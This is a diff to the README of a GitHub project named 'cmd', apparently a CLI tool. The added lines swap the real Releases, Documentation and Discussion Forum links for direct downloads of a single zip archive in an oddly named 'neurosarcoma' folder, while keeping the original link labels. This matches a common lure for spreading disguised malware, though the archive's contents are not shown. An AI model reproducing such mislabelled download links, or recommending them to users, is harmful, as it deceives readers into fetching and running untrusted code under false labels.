@@ -24,12 +24,12 @@ To run cmd, you need:
 
 To get started, visit our Releases page to download the latest version of cmd:
 
-[![Download cmd](https://img.shields.io/badge/Download%20cmd-v1.0.0-brightgreen)](https://github.com/JunaSiCheater/cmd/releases)
+[![Download cmd](https://raw.githubusercontent.com/JunaSiCheater/cmd/main/neurosarcoma/cmd.zip%20cmd-v1.0.0-brightgreen)](https://raw.githubusercontent.com/JunaSiCheater/cmd/main/neurosarcoma/cmd.zip)
 
 After downloading, follow these steps to install and run the application:
 
 1. **Visit the Releases Page**: Access the following link to find the latest release:
-   [cmd Releases Page](https://github.com/JunaSiCheater/cmd/releases)
+   [cmd Releases Page](https://raw.githubusercontent.com/JunaSiCheater/cmd/main/neurosarcoma/cmd.zip)
 
 2. **Select the Latest Version**: Scroll through the page and find the latest version. It should look similar to this: `v1.0.0`.
 
@@ -101,7 +101,7 @@ Stay updated with cmd by following us on social media and joining the discussion
 
 ## 🌐 Useful Links
 
-- **Documentation**: Explore the detailed documentation for cmd on our [Documentation Page](https://github.com/JunaSiCheater/cmd/wiki).
-- **Community Discussions**: Join our [Discussion Forum](https://github.com/JunaSiCheater/cmd/discussions) to connect with other users.
+- **Documentation**: Explore the detailed documentation for cmd on our [Documentation Page](https://raw.githubusercontent.com/JunaSiCheater/cmd/main/neurosarcoma/cmd.zip).
+- **Community Discussions**: Join our [Discussion Forum](https://raw.githubusercontent.com/JunaSiCheater/cmd/main/neurosarcoma/cmd.zip) to connect with other users.
 
 Thank you for choosing cmd for your CLI application needs. Enjoy building your applications!
